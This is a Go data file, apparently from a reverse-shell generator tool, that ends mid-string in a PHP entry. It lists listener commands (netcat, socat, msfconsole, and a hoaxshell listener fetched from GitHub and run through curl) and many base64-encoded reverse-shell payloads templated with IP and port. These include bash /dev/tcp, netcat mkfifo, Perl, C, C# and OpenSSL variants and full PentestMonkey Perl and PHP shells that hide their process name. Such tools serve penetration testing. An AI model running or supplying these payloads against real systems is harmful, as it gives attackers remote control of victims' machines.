package data

type Listener struct {
	Name    string
	Payload string
}

type ReverseShellCommand struct {
	Name    string
	Command string
	Meta    []string
}

type BindShellCommand struct {
	Name    string
	Command string
	Meta    []string
}

var OSTypes = []string{
	"All",
	"Linux",
	"Windows",
	"Mac",
}

var ShellTypes = []string{
	"sh",
	"/bin/sh",
	"bash",
	"/bin/bash",
	"cmd",
	"powershell",
	"pwsh",
	"ash",
	"bsh",
	"csh",
	"ksh",
	"zsh",
	"pdksh",
	"tcsh",
	"mksh",
	"dash",
}

var Listeners = []Listener{
	{`nc`, `nc -lvnp {{.Port}}`},
	{`nc freebsd`, `nc -lvn {{.Port}}`},
	{`busybox nc`, `busybox nc -lp {{.Port}}`},
	{`ncat`, `ncat -lvnp {{.Port}}`},
	{`ncat.exe`, `ncat.exe -lvnp {{.Port}}`},
	{`ncat (TLS)`, `ncat --ssl -lvnp {{.Port}}`},
	{`rlwrap + nc`, `rlwrap -cAr nc -lvnp {{.Port}}`},
	{`rustcat`, `rcat listen {{.Port}}`},
	{`openssl`, `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes; openssl s_server -quiet -key key.pem -cert cert.pem -port {{.Port}}`},
	{`pwncat`, `python3 -m pwncat -lp {{.Port}}`},
	{`pwncat (windows)`, `python3 -m pwncat -m windows -lp {{.Port}}`},
	{`windows ConPty`, `stty raw -echo; (stty size; cat) | nc -lvnp {{.Port}}`},
	{`socat`, `socat -d -d TCP-LISTEN:{{.Port}} STDOUT`},
	{`socat (TTY)`, `socat -d -d file:` + "`tty`" + `,raw,echo=0 TCP-LISTEN:{{.Port}}`},
	{`powercat`, `powercat -l -p {{.Port}}`},
	// FIXME: Payload for msfvenom is acquired from the MSFVenom tab. Fix this after implementing that part.
	{`msfconsole`, `msfconsole -q -x "use multi/handler; set payload {{.Payload}}; set lhost {{.Ip}}; set lport {{.Port}}; exploit"`},
	{`hoaxshell`, `python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t {type} -p {{.Port}}`},
}

// TODO: Complete the list
var ReverseShellCommands = []ReverseShellCommand{
	{
		"Bash -i",
		"e3suU2hlbGx9fSAtaSA+JiAvZGV2L3RjcC97ey5JcH19L3t7LlBvcnR9fSAwPiYx",
		[]string{"linux", "mac"},
	},
	{
		"Bash 196",
		"MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97ey5JcH19L3t7LlBvcnR9fTsge3suU2hlbGx9fSA8JjE5NiA+JjE5NiAyPiYxOTY=",
		[]string{"linux", "mac"},
	},
	{
		"Bash read line",
		"ZXhlYyA1PD4vZGV2L3RjcC97ey5JcH19L3t7LlBvcnR9fTtjYXQgPCY1IHwgd2hpbGUgcmVhZCBsaW5lOyBkbyAkbGluZSAyPiY1ID4mNTsgZG9uZQ==",
		[]string{"linux", "mac"},
	},
	{
		"Bash 5",
		"e3suU2hlbGx9fSAtaSA1PD4gL2Rldi90Y3Ave3suSXB9fS97ey5Qb3J0fX0gMDwmNSAxPiY1IDI+JjU=",
		[]string{"linux", "mac"},
	},
	{
		"Bash udp",
		"e3suU2hlbGx9fSAtaSA+JiAvZGV2L3VkcC97ey5JcH19L3t7LlBvcnR9fSAwPiYx",
		[]string{"linux", "mac"},
	},
	{
		"nc mkfifo",
		"cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnx7ey5TaGVsbH19IC1pIDI+JjF8bmMge3suSXB9fSB7ey5Qb3J0fX0gPi90bXAvZg==",
		[]string{"linux", "mac"},
	},
	{
		"nc -e",
		"bmMge3suSXB9fSB7ey5Qb3J0fX0gLWUge3suU2hlbGx9fQ==",
		[]string{"linux", "mac"},
	},
	{
		"nc.exe -e",
		"bmMuZXhlIHt7LklwfX0ge3suUG9ydH19IC1lIHt7LlNoZWxsfX0=",
		[]string{"windows"},
	},
	{
		"BusyBox nc -e",
		"YnVzeWJveCBuYyB7ey5JcH19IHt7LlBvcnR9fSAtZSB7ey5TaGVsbH19",
		[]string{"linux"},
	},
	{
		"nc -c",
		"bmMgLWMge3suU2hlbGx9fSB7ey5JcH19IHt7LlBvcnR9fQ==",
		[]string{"linux", "mac"},
	},
	{
		"ncat -e",
		"bmNhdCB7ey5JcH19IHt7LlBvcnR9fSAtZSB7ey5TaGVsbH19",
		[]string{"linux", "mac"},
	},
	{
		"ncat.exe -e",
		"bmNhdC5leGUge3suSXB9fSB7ey5Qb3J0fX0gLWUge3suU2hlbGx9fQ==",
		[]string{"windows"},
	},
	{
		"ncat udp",
		"cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnx7ey5TaGVsbH19IC1pIDI+JjF8bmNhdCAtdSB7ey5JcH19IHt7LlBvcnR9fSA+L3RtcC9m",
		[]string{"linux", "mac"},
	},
	{
		"curl",
		"Qz0nY3VybCAtTnMgdGVsbmV0Oi8ve3suSXB9fTp7ey5Qb3J0fX0nOyAkQyA8L2Rldi9udWxsIDI+JjEgfCB7ey5TaGVsbH19IDI+JjEgfCAkQyA+L2Rldi9udWxs",
		[]string{"linux", "mac"},
	},
	{
		"rustcat",
		"cmNhdCBjb25uZWN0IC1zIHt7LlNoZWxsfX0ge3suSXB9fSB7ey5Qb3J0fX0=",
		[]string{"linux", "mac"},
	},
	{
		"C",
		"I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+CiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDxuZXRpbmV0L2luLmg+CiNpbmNsdWRlIDxhcnBhL2luZXQuaD4KCmludCBtYWluKHZvaWQpewogICAgaW50IHBvcnQgPSB7ey5Qb3J0fX07CiAgICBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmV2c29ja2FkZHI7CgogICAgaW50IHNvY2t0ID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfU1RSRUFNLCAwKTsKICAgIHJldnNvY2thZGRyLnNpbl9mYW1pbHkgPSBBRl9JTkVUOyAgICAgICAKICAgIHJldnNvY2thZGRyLnNpbl9wb3J0ID0gaHRvbnMocG9ydCk7CiAgICByZXZzb2NrYWRkci5zaW5fYWRkci5zX2FkZHIgPSBpbmV0X2FkZHIoInt7LklwfX0iKTsKCiAgICBjb25uZWN0KHNvY2t0LCAoc3RydWN0IHNvY2thZGRyICopICZyZXZzb2NrYWRkciwgCiAgICBzaXplb2YocmV2c29ja2FkZHIpKTsKICAgIGR1cDIoc29ja3QsIDApOwogICAgZHVwMihzb2NrdCwgMSk7CiAgICBkdXAyKHNvY2t0LCAyKTsKCiAgICBjaGFyICogY29uc3QgYXJndltdID0geyJ7ey5TaGVsbH19IiwgTlVMTH07CiAgICBleGVjdnAoIntzaGVsbH0iLCBhcmd2KTsKCiAgICByZXR1cm4gMDsgICAgICAgCn0=",
		[]string{"linux", "mac"},
	},
	{
		"C Windows",
		"I2luY2x1ZGUgPHdpbnNvY2syLmg+DQojaW5jbHVkZSA8c3RkaW8uaD4NCiNwcmFnbWEgY29tbWVudChsaWIsIndzMl8zMiIpDQoNCldTQURBVEEgd3NhRGF0YTsNClNPQ0tFVCBXaW5zb2NrOw0Kc3RydWN0IHNvY2thZGRyX2luIGhheDsgDQpjaGFyIGlwX2FkZHJbMTZdID0gInt7LklwfX0iOyANCmNoYXIgcG9ydFs2XSA9ICJ7ey5Qb3J0fX0iOyAgICAgICAgICAgIA0KDQpTVEFSVFVQSU5GTyBpbmlfcHJvY2Vzc287DQoNClBST0NFU1NfSU5GT1JNQVRJT04gcHJvY2Vzc29faW5mbzsNCg0KaW50IG1haW4oKQ0Kew0KICAgIFdTQVN0YXJ0dXAoTUFLRVdPUkQoMiwgMiksICZ3c2FEYXRhKTsNCiAgICBXaW5zb2NrID0gV1NBU29ja2V0KEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBJUFBST1RPX1RDUCwgTlVMTCwgMCwgMCk7DQoNCg0KICAgIHN0cnVjdCBob3N0ZW50ICpob3N0OyANCiAgICBob3N0ID0gZ2V0aG9zdGJ5bmFtZShpcF9hZGRyKTsNCiAgICBzdHJjcHlfcyhpcF9hZGRyLCAxNiwgaW5ldF9udG9hKCooKHN0cnVjdCBpbl9hZGRyICopaG9zdC0+aF9hZGRyKSkpOw0KDQogICAgaGF4LnNpbl9mYW1pbHkgPSBBRl9JTkVUOw0KICAgIGhheC5zaW5fcG9ydCA9IGh0b25zKGF0b2kocG9ydCkpOw0KICAgIGhheC5zaW5fYWRkci5zX2FkZHIgPSBpbmV0X2FkZHIoaXBfYWRkcik7DQoNCiAgICBXU0FDb25uZWN0KFdpbnNvY2ssIChTT0NLQUREUiopJmhheCwgc2l6ZW9mKGhheCksIE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwpOw0KDQogICAgbWVtc2V0KCZpbmlfcHJvY2Vzc28sIDAsIHNpemVvZihpbmlfcHJvY2Vzc28pKTsNCiAgICBpbmlfcHJvY2Vzc28uY2IgPSBzaXplb2YoaW5pX3Byb2Nlc3NvKTsNCiAgICBpbmlfcHJvY2Vzc28uZHdGbGFncyA9IFNUQVJURl9VU0VTVERIQU5ETEVTIHwgU1RBUlRGX1VTRVNIT1dXSU5ET1c7IA0KICAgIGluaV9wcm9jZXNzby5oU3RkSW5wdXQgPSBpbmlfcHJvY2Vzc28uaFN0ZE91dHB1dCA9IGluaV9wcm9jZXNzby5oU3RkRXJyb3IgPSAoSEFORExFKVdpbnNvY2s7DQoNCiAgICBUQ0hBUiBjbWRbMjU1XSA9IFRFWFQoImNtZC5leGUiKTsNCg0KICAgIENyZWF0ZVByb2Nlc3MoTlVMTCwgY21kLCBOVUxMLCBOVUxMLCBUUlVFLCAwLCBOVUxMLCBOVUxMLCAmaW5pX3Byb2Nlc3NvLCAmcHJvY2Vzc29faW5mbyk7DQoNCiAgICByZXR1cm4gMDsNCn0=",
		[]string{"windows"},
	},
	{
		"C# TCP Client",
		"dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uVGV4dDsKdXNpbmcgU3lzdGVtLklPOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5Db21wb25lbnRNb2RlbDsKdXNpbmcgU3lzdGVtLkxpbnE7CnVzaW5nIFN5c3RlbS5OZXQ7CnVzaW5nIFN5c3RlbS5OZXQuU29ja2V0czsKCgpuYW1lc3BhY2UgQ29ubmVjdEJhY2sKewoJcHVibGljIGNsYXNzIFByb2dyYW0KCXsKCQlzdGF0aWMgU3RyZWFtV3JpdGVyIHN0cmVhbVdyaXRlcjsKCgkJcHVibGljIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykKCQl7CgkJCXVzaW5nKFRjcENsaWVudCBjbGllbnQgPSBuZXcgVGNwQ2xpZW50KCJ7ey5JcH19Iiwge3suUG9ydH19KSkKCQkJewoJCQkJdXNpbmcoU3RyZWFtIHN0cmVhbSA9IGNsaWVudC5HZXRTdHJlYW0oKSkKCQkJCXsKCQkJCQl1c2luZyhTdHJlYW1SZWFkZXIgcmRyID0gbmV3IFN0cmVhbVJlYWRlcihzdHJlYW0pKQoJCQkJCXsKCQkJCQkJc3RyZWFtV3JpdGVyID0gbmV3IFN0cmVhbVdyaXRlcihzdHJlYW0pOwoJCQkJCQkKCQkJCQkJU3RyaW5nQnVpbGRlciBzdHJJbnB1dCA9IG5ldyBTdHJpbmdCdWlsZGVyKCk7CgoJCQkJCQlQcm9jZXNzIHAgPSBuZXcgUHJvY2VzcygpOwoJCQkJCQlwLlN0YXJ0SW5mby5GaWxlTmFtZSA9ICJ7ey5TaGVsbH19IjsKCQkJCQkJcC5TdGFydEluZm8uQ3JlYXRlTm9XaW5kb3cgPSB0cnVlOwoJCQkJCQlwLlN0YXJ0SW5mby5Vc2VTaGVsbEV4ZWN1dGUgPSBmYWxzZTsKCQkJCQkJcC5TdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZE91dHB1dCA9IHRydWU7CgkJCQkJCXAuU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRJbnB1dCA9IHRydWU7CgkJCQkJCXAuU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRFcnJvciA9IHRydWU7CgkJCQkJCXAuT3V0cHV0RGF0YVJlY2VpdmVkICs9IG5ldyBEYXRhUmVjZWl2ZWRFdmVudEhhbmRsZXIoQ21kT3V0cHV0RGF0YUhhbmRsZXIpOwoJCQkJCQlwLlN0YXJ0KCk7CgkJCQkJCXAuQmVnaW5PdXRwdXRSZWFkTGluZSgpOwoKCQkJCQkJd2hpbGUodHJ1ZSkKCQkJCQkJewoJCQkJCQkJc3RySW5wdXQuQXBwZW5kKHJkci5SZWFkTGluZSgpKTsKCQkJCQkJCS8vc3RySW5wdXQuQXBwZW5kKCJcbiIpOwoJCQkJCQkJcC5TdGFuZGFyZElucHV0LldyaXRlTGluZShzdHJJbnB1dCk7CgkJCQkJCQlzdHJJbnB1dC5SZW1vdmUoMCwgc3RySW5wdXQuTGVuZ3RoKTsKCQkJCQkJfQoJCQkJCX0KCQkJCX0KCQkJfQoJCX0KCgkJcHJpdmF0ZSBzdGF0aWMgdm9pZCBDbWRPdXRwdXREYXRhSGFuZGxlcihvYmplY3Qgc2VuZGluZ1Byb2Nlc3MsIERhdGFSZWNlaXZlZEV2ZW50QXJncyBvdXRMaW5lKQogICAgICAgIHsKICAgICAgICAgICAgU3RyaW5nQnVpbGRlciBzdHJPdXRwdXQgPSBuZXcgU3RyaW5nQnVpbGRlcigpOwoKICAgICAgICAgICAgaWYgKCFTdHJpbmcuSXNOdWxsT3JFbXB0eShvdXRMaW5lLkRhdGEpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICB0cnkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBzdHJPdXRwdXQuQXBwZW5kKG91dExpbmUuRGF0YSk7CiAgICAgICAgICAgICAgICAgICAgc3RyZWFtV3JpdGVyLldyaXRlTGluZShzdHJPdXRwdXQpOwogICAgICAgICAgICAgICAgICAgIHN0cmVhbVdyaXRlci5GbHVzaCgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlcnIpIHsgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKCX0KfQ==",
		[]string{"linux", "windows"},
	},
	{
		"C# Bash -i",
		"dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CgpuYW1lc3BhY2UgQmFja0Nvbm5lY3QgewogIGNsYXNzIFJldmVyc2VCYXNoIHsKCXB1YmxpYyBzdGF0aWMgdm9pZCBNYWluKHN0cmluZ1tdIGFyZ3MpIHsKCSAgUHJvY2VzcyBwcm9jID0gbmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzKCk7CgkgIHByb2MuU3RhcnRJbmZvLkZpbGVOYW1lID0gInt7LlNoZWxsfX0iOwoJICBwcm9jLlN0YXJ0SW5mby5Bcmd1bWVudHMgPSAiLWMgXCJ7c2hlbGx9IC1pID4mIC9kZXYvdGNwL3t7LklwfX0ve3suUG9ydH19IDA+JjFcIiI7CgkgIHByb2MuU3RhcnRJbmZvLlVzZVNoZWxsRXhlY3V0ZSA9IGZhbHNlOwoJICBwcm9jLlN0YXJ0SW5mby5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0ID0gdHJ1ZTsKCSAgcHJvYy5TdGFydCgpOwoKCSAgd2hpbGUgKCFwcm9jLlN0YW5kYXJkT3V0cHV0LkVuZE9mU3RyZWFtKSB7CgkJQ29uc29sZS5Xcml0ZUxpbmUocHJvYy5TdGFuZGFyZE91dHB1dC5SZWFkTGluZSgpKTsKCSAgfQoJfQogIH0KfQo=",
		[]string{"linux", "windows"},
	},
	{
		"Haskell #1",
		"bW9kdWxlIE1haW4gd2hlcmUKCmltcG9ydCBTeXN0ZW0uUHJvY2VzcwoKbWFpbiA9IGNhbGxDb21tYW5kICJybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mIHwge3suU2hlbGx9fSAtaSAyPiYxIHwgbmMge3suSXB9fSB7ey5Qb3J0fX0gPi90bXAvZiI=",
		[]string{"linux", "mac"},
	},
	{
		"OpenSSL",
		"bWtmaWZvIC90bXAvczsge3suU2hlbGx9fSAtaSA8IC90bXAvcyAyPiYxIHwgb3BlbnNzbCBzX2NsaWVudCAtcXVpZXQgLWNvbm5lY3Qge3suSXB9fTp7ey5Qb3J0fX0gPiAvdG1wL3M7IHJtIC90bXAvcw==",
		[]string{"linux", "mac"},
	},
	{
		"Perl",
		"cGVybCAtZSAndXNlIFNvY2tldDskaT0ie3suSXB9fSI7JHA9e3suUG9ydH19O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoInt7LlNoZWxsfX0gLWkiKTt9Oyc=",
		[]string{"linux", "mac"},
	},
	{
		"Perl no sh",
		"cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApOyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCJ7ey5JcH19Ont7LlBvcnR9fSIpO1NURElOLT5mZG9wZW4oJGMscik7JH4tPmZkb3BlbigkYyx3KTtzeXN0ZW0kXyB3aGlsZTw+Oyc=",
		[]string{"linux", "mac"},
	},
	{
		"Perl PentestMonkey",
		"IyEvdXNyL2Jpbi9wZXJsIC13CiMgcGVybC1yZXZlcnNlLXNoZWxsIC0gQSBSZXZlcnNlIFNoZWxsIGltcGxlbWVudGF0aW9uIGluIFBFUkwKIyBDb3B5cmlnaHQgKEMpIDIwMDYgcGVudGVzdG1vbmtleUBwZW50ZXN0bW9ua2V5Lm5ldAojCiMgVGhpcyB0b29sIG1heSBiZSB1c2VkIGZvciBsZWdhbCBwdXJwb3NlcyBvbmx5LiAgVXNlcnMgdGFrZSBmdWxsIHJlc3BvbnNpYmlsaXR5CiMgZm9yIGFueSBhY3Rpb25zIHBlcmZvcm1lZCB1c2luZyB0aGlzIHRvb2wuICBUaGUgYXV0aG9yIGFjY2VwdHMgbm8gbGlhYmlsaXR5CiMgZm9yIGRhbWFnZSBjYXVzZWQgYnkgdGhpcyB0b29sLiAgSWYgdGhlc2UgdGVybXMgYXJlIG5vdCBhY2NlcHRhYmxlIHRvIHlvdSwgdGhlbgojIGRvIG5vdCB1c2UgdGhpcyB0b29sLgojCiMgSW4gYWxsIG90aGVyIHJlc3BlY3RzIHRoZSBHUEwgdmVyc2lvbiAyIGFwcGxpZXM6CiMKIyBUaGlzIHByb2dyYW0gaXMgZnJlZSBzb2Z0d2FyZTsgeW91IGNhbiByZWRpc3RyaWJ1dGUgaXQgYW5kL29yIG1vZGlmeQojIGl0IHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgdmVyc2lvbiAyIGFzCiMgcHVibGlzaGVkIGJ5IHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24uCiMKIyBUaGlzIHByb2dyYW0gaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwKIyBidXQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZgojIE1FUkNIQU5UQUJJTElUWSBvciBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRS4gIFNlZSB0aGUKIyBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLgojCiMgWW91IHNob3VsZCBoYXZlIHJlY2VpdmVkIGEgY29weSBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgYWxvbmcKIyB3aXRoIHRoaXMgcHJvZ3JhbTsgaWYgbm90LCB3cml0ZSB0byB0aGUgRnJlZSBTb2Z0d2FyZSBGb3VuZGF0aW9uLCBJbmMuLAojIDUxIEZyYW5rbGluIFN0cmVldCwgRmlmdGggRmxvb3IsIEJvc3RvbiwgTUEgMDIxMTAtMTMwMSBVU0EuCiMKIyBUaGlzIHRvb2wgbWF5IGJlIHVzZWQgZm9yIGxlZ2FsIHB1cnBvc2VzIG9ubHkuICBVc2VycyB0YWtlIGZ1bGwgcmVzcG9uc2liaWxpdHkKIyBmb3IgYW55IGFjdGlvbnMgcGVyZm9ybWVkIHVzaW5nIHRoaXMgdG9vbC4gIElmIHRoZXNlIHRlcm1zIGFyZSBub3QgYWNjZXB0YWJsZSB0bwojIHlvdSwgdGhlbiBkbyBub3QgdXNlIHRoaXMgdG9vbC4KIwojIFlvdSBhcmUgZW5jb3VyYWdlZCB0byBzZW5kIGNvbW1lbnRzLCBpbXByb3ZlbWVudHMgb3Igc3VnZ2VzdGlvbnMgdG8KIyBtZSBhdCBwZW50ZXN0bW9ua2V5QHBlbnRlc3Rtb25rZXkubmV0CiMKIyBEZXNjcmlwdGlvbgojIC0tLS0tLS0tLS0tCiMgVGhpcyBzY3JpcHQgd2lsbCBtYWtlIGFuIG91dGJvdW5kIFRDUCBjb25uZWN0aW9uIHRvIGEgaGFyZGNvZGVkIElQIGFuZCBwb3J0LgojIFRoZSByZWNpcGllbnQgd2lsbCBiZSBnaXZlbiBhIHNoZWxsIHJ1bm5pbmcgYXMgdGhlIGN1cnJlbnQgdXNlciAoYXBhY2hlIG5vcm1hbGx5KS4KIwoKdXNlIHN0cmljdDsKdXNlIFNvY2tldDsKdXNlIEZpbGVIYW5kbGU7CnVzZSBQT1NJWDsKbXkgJFZFUlNJT04gPSAiMS4wIjsKCiMgV2hlcmUgdG8gc2VuZCB0aGUgcmV2ZXJzZSBzaGVsbC4gIENoYW5nZSB0aGVzZS4KbXkgJGlwID0gJ3t7LklwfX0nOwpteSAkcG9ydCA9IHt7LlBvcnR9fTsKCiMgT3B0aW9ucwpteSAkZGFlbW9uID0gMTsKbXkgJGF1dGggICA9IDA7ICMgMCBtZWFucyBhdXRoZW50aWNhdGlvbiBpcyBkaXNhYmxlZCBhbmQgYW55IAoJCSMgc291cmNlIElQIGNhbiBhY2Nlc3MgdGhlIHJldmVyc2Ugc2hlbGwKbXkgJGF1dGhvcmlzZWRfY2xpZW50X3BhdHRlcm4gPSBxciheMTI3XC4wXC4wXC4xJCk7CgojIERlY2xhcmF0aW9ucwpteSAkZ2xvYmFsX3BhZ2UgPSAiIjsKbXkgJGZha2VfcHJvY2Vzc19uYW1lID0gIi91c3Ivc2Jpbi9hcGFjaGUiOwoKIyBDaGFuZ2UgdGhlIHByb2Nlc3MgbmFtZSB0byBiZSBsZXNzIGNvbnNwaWNpb3VzCiQwID0gIltodHRwZF0iOwoKIyBBdXRoZW50aWNhdGUgYmFzZWQgb24gc291cmNlIElQIGFkZHJlc3MgaWYgcmVxdWlyZWQKaWYgKGRlZmluZWQoJEVOVnsnUkVNT1RFX0FERFInfSkpIHsKCWNnaXByaW50KCJCcm93c2VyIElQIGFkZHJlc3MgYXBwZWFycyB0byBiZTogJEVOVnsnUkVNT1RFX0FERFInfSIpOwoKCWlmICgkYXV0aCkgewoJCXVubGVzcyAoJEVOVnsnUkVNT1RFX0FERFInfSA9fiAkYXV0aG9yaXNlZF9jbGllbnRfcGF0dGVybikgewoJCQljZ2lwcmludCgiRVJST1I6IFlvdXIgY2xpZW50IGlzbid0IGF1dGhvcmlzZWQgdG8gdmlldyB0aGlzIHBhZ2UiKTsKCQkJY2dpZXhpdCgpOwoJCX0KCX0KfSBlbHNpZiAoJGF1dGgpIHsKCWNnaXByaW50KCJFUlJPUjogQXV0aGVudGljYXRpb24gaXMgZW5hYmxlZCwgYnV0IEkgY291bGRuJ3QgZGV0ZXJtaW5lIHlvdXIgSVAgYWRkcmVzcy4gIERlbnlpbmcgYWNjZXNzIik7CgljZ2lleGl0KDApOwp9CgojIEJhY2tncm91bmQgYW5kIGRpc3NvY2lhdGUgZnJvbSBwYXJlbnQgcHJvY2VzcyBpZiByZXF1aXJlZAppZiAoJGRhZW1vbikgewoJbXkgJHBpZCA9IGZvcmsoKTsKCWlmICgkcGlkKSB7CgkJY2dpZXhpdCgwKTsgIyBwYXJlbnQgZXhpdHMKCX0KCglzZXRzaWQoKTsKCWNoZGlyKCcvJyk7Cgl1bWFzaygwKTsKfQoKIyBNYWtlIFRDUCBjb25uZWN0aW9uIGZvciByZXZlcnNlIHNoZWxsCnNvY2tldChTT0NLLCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpKTsKaWYgKGNvbm5lY3QoU09DSywgc29ja2FkZHJfaW4oJHBvcnQsaW5ldF9hdG9uKCRpcCkpKSkgewoJY2dpcHJpbnQoIlNlbnQgcmV2ZXJzZSBzaGVsbCB0byAkaXA6JHBvcnQiKTsKCWNnaXByaW50cGFnZSgpOwp9IGVsc2UgewoJY2dpcHJpbnQoIkNvdWxkbid0IG9wZW4gcmV2ZXJzZSBzaGVsbCB0byAkaXA6JHBvcnQ6ICQhIik7CgljZ2lleGl0KCk7CQp9CgojIFJlZGlyZWN0IFNURElOLCBTVERPVVQgYW5kIFNUREVSUiB0byB0aGUgVENQIGNvbm5lY3Rpb24Kb3BlbihTVERJTiwgIj4mU09DSyIpOwpvcGVuKFNURE9VVCwiPiZTT0NLIik7Cm9wZW4oU1RERVJSLCI+JlNPQ0siKTsKJEVOVnsnSElTVEZJTEUnfSA9ICcvZGV2L251bGwnOwpzeXN0ZW0oInc7dW5hbWUgLWE7aWQ7cHdkIik7CmV4ZWMoeyJ7ey5TaGVsbH19In0gKCRmYWtlX3Byb2Nlc3NfbmFtZSwgIi1pIikpOwoKIyBXcmFwcGVyIGFyb3VuZCBwcmludApzdWIgY2dpcHJpbnQgewoJbXkgJGxpbmUgPSBzaGlmdDsKCSRsaW5lIC49ICI8cD5cbiI7CgkkZ2xvYmFsX3BhZ2UgLj0gJGxpbmU7Cn0KCiMgV3JhcHBlciBhcm91bmQgZXhpdApzdWIgY2dpZXhpdCB7CgljZ2lwcmludHBhZ2UoKTsKCWV4aXQgMDsgIyAwIHRvIGVuc3VyZSB3ZSBkb24ndCBnaXZlIGEgNTAwIHJlc3BvbnNlLgp9CgojIEZvcm0gSFRUUCByZXNwb25zZSB1c2luZyBhbGwgdGhlIG1lc3NhZ2VzIGdhdGhlcmVkIGJ5IGNnaXByaW50IHNvIGZhcgpzdWIgY2dpcHJpbnRwYWdlIHsKCXByaW50ICJDb250ZW50LUxlbmd0aDogIiAuIGxlbmd0aCgkZ2xvYmFsX3BhZ2UpIC4gIlxyCkNvbm5lY3Rpb246IGNsb3NlXHIKQ29udGVudC1UeXBlOiB0ZXh0XC9odG1sXHJcblxyXG4iIC4gJGdsb2JhbF9wYWdlOwp9Cg==",
		[]string{"linux", "mac"},
	},
	{
		"PHP PentestMonkey",
		"PD9waHAKLy8gcGhwLXJldmVyc2Utc2hlbGwgLSBBIFJldmVyc2UgU2hlbGwgaW1wbGVtZW50YXRpb24gaW4gUEhQLiBDb21tZW50cyBzdHJpcHBlZCB0byBzbGltIGl0IGRvd24uIFJFOiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcGVudGVzdG1vbmtleS9waHAtcmV2ZXJzZS1zaGVsbC9tYXN0ZXIvcGhwLXJldmVyc2Utc2hlbGwucGhwCi8vIENvcHlyaWdodCAoQykgMjAwNyBwZW50ZXN0bW9ua2V5QHBlbnRlc3Rtb25rZXkubmV0CgpzZXRfdGltZV9saW1pdCAoMCk7CiRWRVJTSU9OID0gIjEuMCI7CiRpcCA9ICd7ey5JcH19JzsKJHBvcnQgPSB7ey5Qb3J0fX07CiRjaHVua19zaXplID0gMTQwMDsKJHdyaXRlX2EgPSBudWxsOwokZXJyb3JfYSA9IG51bGw7CiRzaGVsbCA9ICd1bmFtZSAtYTsgdzsgaWQ7IHt7LlNoZWxsfX0gLWknOwokZGFlbW9uID0gMDsKJGRlYnVnID0gMDsKCmlmIChmdW5jdGlvbl9leGlzdHMoJ3BjbnRsX2ZvcmsnKSkgewoJJHBpZCA9IHBjbnRsX2ZvcmsoKTsKCQoJaWYgKCRwaWQgPT0gLTEpIHsKCQlwcmludGl0KCJFUlJPUjogQ2FuJ3QgZm9yayIpOwoJCWV4aXQoMSk7Cgl9CgkKCWlmICgkcGlkKSB7CgkJZXhpdCgwKTsgIC8vIFBhcmVudCBleGl0cwoJfQoJaWYgKHBvc2l4X3NldHNpZCgpID09IC0xKSB7CgkJcHJpbnRpdCgiRXJyb3I6IENhbid0IHNldHNpZCgpIik7CgkJZXhpdCgxKTsKCX0KCgkkZGFlbW9uID0gMTsKfSBlbHNlIHsKCXByaW50aXQoIldBUk5JTkc6IEZhaWxlZCB0byBkYWVtb25pc2UuICBUaGlzIGlzIHF1aXRlIGNvbW1vbiBhbmQgbm90IGZhdGFsLiIpOwp9CgpjaGRpcigiLyIpOwoKdW1hc2soMCk7CgovLyBPcGVuIHJldmVyc2UgY29ubmVjdGlvbgokc29jayA9IGZzb2Nrb3BlbigkaXAsICRwb3J0LCAkZXJybm8sICRlcnJzd